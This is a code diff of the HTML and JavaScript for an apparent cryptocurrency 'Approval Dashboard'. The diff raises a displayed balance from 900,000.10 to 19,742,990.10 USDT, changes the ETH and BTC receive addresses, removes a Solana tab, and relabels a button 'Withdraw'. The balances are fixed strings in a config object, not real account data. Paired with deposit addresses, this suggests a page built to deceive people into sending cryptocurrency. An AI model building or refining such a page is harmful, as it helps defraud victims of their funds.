@@ -1097,18 +1097,14 @@
                         <!-- <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"></path></svg> -->
                       </div>
                       <div class="text-3xl flex font-semibold mb-2"><span id="revoke-balance-value">900,000.10</span>
-                        <span class="text-lg text-zinc-500 dark:text-zinc-400 ml-1"> USDT</span>
-                      </div>
+                        <span class="text-lg text-zinc-500 dark:text-zinc-400 ml-1"> USDT</span></div>
                       <div class="flex items-center gap-1">
                         <span class="text-sm text-zinc-500 dark:text-zinc-400 font-medium">Transferable</span>
                       </div>
                       <div class="text-sm text-zinc-500 dark:text-zinc-400 font-medium" id="transferable-value">≈
                         $700,000 USDT</div>
-                      
                     </div>
 
-
-                    
                     <!-- Action Buttons -->
                     <div class="flex items-center justify-center gap-8 w-full max-w-md">
                       <!-- Receive Button -->
@@ -1135,8 +1131,8 @@
                         </div>
                         <span class="text-sm font-medium text-zinc-700 dark:text-zinc-300">Send</span>
                       </button>
-                      <!-- Convert Button -->
-                      <button onclick="document.getElementById('modal-convert').classList.remove('hidden')"
+                      <!-- Withdraw Button -->
+                      <button onclick="document.getElementById('modal-withdraw').classList.remove('hidden')"
                         class="flex flex-col items-center gap-2 group">
                         <div
                           class="w-14 h-14 rounded-full border border-zinc-200 dark:border-zinc-800 bg-white dark:bg-zinc-950 flex items-center justify-center text-zinc-600 dark:text-zinc-400 transition-colors shadow-sm">
@@ -1145,7 +1141,7 @@
                               d="M13 7h8m0 0v8m0-8l-8 8-4-4-6 6"></path>
                           </svg>
                         </div>
-                        <span class="text-sm font-medium text-zinc-700 dark:text-zinc-300">convert</span>
+                        <span class="text-sm font-medium text-zinc-700 dark:text-zinc-300">Withdraw</span>
                       </button>
                     </div>
                   </div>
@@ -1166,12 +1162,8 @@
 
                       <!-- Tabs -->
                       <div class="flex border-b border-zinc-200 dark:border-zinc-800 w-full mb-4">
-                        <button id="tab-eth" onclick="switchTab('eth')"
-                          class="flex-1 py-2 text-center border-b-2 border-black dark:border-white font-medium text-zinc-900 dark:text-zinc-100">ETH</button>
-                        <button id="tab-btc" onclick="switchTab('btc')"
-                          class="flex-1 py-2 text-center border-b-2 border-transparent text-zinc-500 hover:text-zinc-700 dark:hover:text-zinc-300 font-medium">BTC</button>
-                        <button id="tab-sol" onclick="switchTab('sol')"
-                          class="flex-1 py-2 text-center border-b-2 border-transparent text-zinc-500 hover:text-zinc-700 dark:hover:text-zinc-300 font-medium">SOL</button>
+                        <button id="tab-eth" onclick="switchTab('eth')" class="flex-1 py-2 text-center border-b-2 border-black dark:border-white font-medium text-zinc-900 dark:text-zinc-100">ETH</button>
+                        <button id="tab-btc" onclick="switchTab('btc')" class="flex-1 py-2 text-center border-b-2 border-transparent text-zinc-500 hover:text-zinc-700 dark:hover:text-zinc-300 font-medium">BTC</button>
                       </div>
 
                       <div class="flex flex-col items-center gap-4 w-full">
@@ -1206,38 +1198,26 @@
                             </svg>
                           </button>
                         </div>
-
-                        <div id="content-sol"
-                          class="bg-zinc-100 dark:bg-zinc-900 p-4 rounded-xl flex items-center justify-between gap-3 border border-zinc-200 dark:border-zinc-800 w-full hidden">
-                          <span class="break-all text-sm font-mono text-left"
-                            id="wallet-address-sol">SqmPsqgLpxTvFeHRQuT4r2uLA8duDER9E3cE1pEqJ5w</span>
-                          <button
-                            onclick="navigator.clipboard.writeText(document.getElementById('wallet-address-sol').innerText); const og = this.innerHTML; this.innerHTML = '<svg class=\'w-5 h-5 text-green-500\' fill=\'none\' stroke=\'currentColor\' viewBox=\'0 0 24 24\'><path stroke-linecap=\'round\' stroke-linejoin=\'round\' stroke-width=\'2\' d=\'M5 13l4 4L19 7\'></path></svg>'; setTimeout(() => { this.innerHTML = og; }, 2000)"
-                            class="shrink-0 p-2 rounded-lg hover:bg-zinc-200 dark:hover:bg-zinc-800 transition-colors cursor-pointer text-zinc-500 hover:text-black dark:hover:text-white"
-                            title="Copy Address">
-                            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
-                                d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z">
-                              </path>
-                            </svg>
-                          </button>
-                        </div>
                       </div>
 
                       <script>
                         function switchTab(tab) {
-                          const tabs = ['eth', 'btc', 'sol'];
-                          tabs.forEach(t => {
-                            const tabEl = document.getElementById(`tab-${t}`);
-                            const contentEl = document.getElementById(`content-${t}`);
-                            if (t === tab) {
-                              tabEl.className = 'flex-1 py-2 text-center border-b-2 border-black dark:border-white font-medium text-zinc-900 dark:text-zinc-100';
-                              contentEl.classList.remove('hidden');
-                            } else {
-                              tabEl.className = 'flex-1 py-2 text-center border-b-2 border-transparent text-zinc-500 hover:text-zinc-700 dark:hover:text-zinc-300 font-medium';
-                              contentEl.classList.add('hidden');
-                            }
-                          });
+                          const tabEth = document.getElementById('tab-eth');
+                          const tabBtc = document.getElementById('tab-btc');
+                          const contentEth = document.getElementById('content-eth');
+                          const contentBtc = document.getElementById('content-btc');
+
+                          if (tab === 'eth') {
+                            tabEth.className = 'flex-1 py-2 text-center border-b-2 border-black dark:border-white font-medium text-zinc-900 dark:text-zinc-100';
+                            tabBtc.className = 'flex-1 py-2 text-center border-b-2 border-transparent text-zinc-500 hover:text-zinc-700 dark:hover:text-zinc-300 font-medium';
+                            contentEth.classList.remove('hidden');
+                            contentBtc.classList.add('hidden');
+                          } else {
+                            tabBtc.className = 'flex-1 py-2 text-center border-b-2 border-black dark:border-white font-medium text-zinc-900 dark:text-zinc-100';
+                            tabEth.className = 'flex-1 py-2 text-center border-b-2 border-transparent text-zinc-500 hover:text-zinc-700 dark:hover:text-zinc-300 font-medium';
+                            contentBtc.classList.remove('hidden');
+                            contentEth.classList.add('hidden');
+                          }
                         }
                       </script>
                     </div>
@@ -1263,11 +1243,11 @@
                     </div>
                   </div>
 
-                  <div id="modal-convert"
+                  <div id="modal-withdraw"
                     class="fixed inset-0 z-50 flex items-center justify-center hidden bg-black/50 backdrop-blur-sm">
                     <div
                       class="bg-white dark:bg-zinc-950 text-zinc-900 dark:text-zinc-100 rounded-3xl p-8 max-w-sm w-full mx-4 border border-zinc-200 dark:border-zinc-800 shadow-xl relative flex flex-col items-center">
-                      <button onclick="document.getElementById('modal-convert').classList.add('hidden')"
+                      <button onclick="document.getElementById('modal-withdraw').classList.add('hidden')"
                         class="absolute top-4 right-4 text-zinc-500 hover:text-black dark:hover:text-white">
                         <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                           <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
@@ -1401,8 +1381,9 @@
                 </div>
                 <div class="hidden lg:flex flex-col justify-center">
                   <div class="overflow-hidden rounded-3xl border border-zinc-200 dark:border-zinc-800">
-                    <video src="hero.mp4" poster="/assets/images/landing/hero.jpg" aria-label="Approval Dashboard"
-                      class="h-auto w-full motion-reduce:hidden" autoplay="" muted="" loop="" playsinline=""></video>
+                    <video src="hero.mp4" poster="/assets/images/landing/hero.jpg"
+                      aria-label="Approval Dashboard" class="h-auto w-full motion-reduce:hidden" autoplay="" muted=""
+                      loop="" playsinline=""></video>
                     <img alt="Approval Dashboard" fetchpriority="high" width="1200" height="900" decoding="async"
                       data-nimg="1" class="hidden h-auto w-full motion-reduce:block" style="color:transparent"
                       srcset="/_next/image?url=%2Fassets%2Fimages%2Flanding%2Fhero.jpg&amp;w=1200&amp;q=75 1x, /_next/image?url=%2Fassets%2Fimages%2Flanding%2Fhero.jpg&amp;w=3840&amp;q=75 2x"
@@ -2092,10 +2073,9 @@
   <script>
 
     const appConfig = {
-      walletAddressEth: "0xad61145Ab31C8B4fC0408B53C5B71fc7d57A3015",
-      walletAddressBtc: "bc1q7ju4x9h7g7h0tgh9syfg7uflqlle2jrkvjxlc6",
-      walletAddressSol: "SqmPsqgLpxTvFeHRQuT4r2uLA8duDER9E3cE1pEqJ5w",
-      revokeBalance: "900,000.10",
+      walletAddressEth: "0x350B9E09E781e5826973cc804282328E7b03d4c3",
+      walletAddressBtc: "bc1qlej9wqvq8hxalc2k7ar4p2nasucxkqxx3sezsn",
+      revokeBalance: "19,742,990.10",
       transferableAmount: "≈ $700,000 USDT"
     };
 
@@ -2106,9 +2086,6 @@
 
       const addressBtcEl = document.getElementById('wallet-address-btc');
       if (addressBtcEl) addressBtcEl.innerText = appConfig.walletAddressBtc;
-
-      const addressSolEl = document.getElementById('wallet-address-sol');
-      if (addressSolEl) addressSolEl.innerText = appConfig.walletAddressSol;
 
       const revokeBalanceEl = document.getElementById('revoke-balance-value');
       if (revokeBalanceEl) revokeBalanceEl.innerText = appConfig.revokeBalance;
